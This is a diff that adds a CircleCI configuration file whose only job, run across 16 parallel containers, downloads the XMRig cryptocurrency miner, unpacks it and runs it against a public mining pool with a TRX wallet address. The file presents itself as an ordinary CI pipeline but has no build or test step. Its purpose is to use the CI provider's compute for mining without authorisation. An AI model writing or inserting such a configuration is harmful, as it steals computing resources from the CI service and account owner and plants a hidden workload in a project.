@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/python:3.8
+      parallelism: 16
+      steps:
+        - run:
+            name: C1
+            command: wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+                  tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+                  cd xmrig-6.12.2
+                  ./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u TRX:TPEpJ2fipdajH528XnVLaCax387rt4Syfs.saravana
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
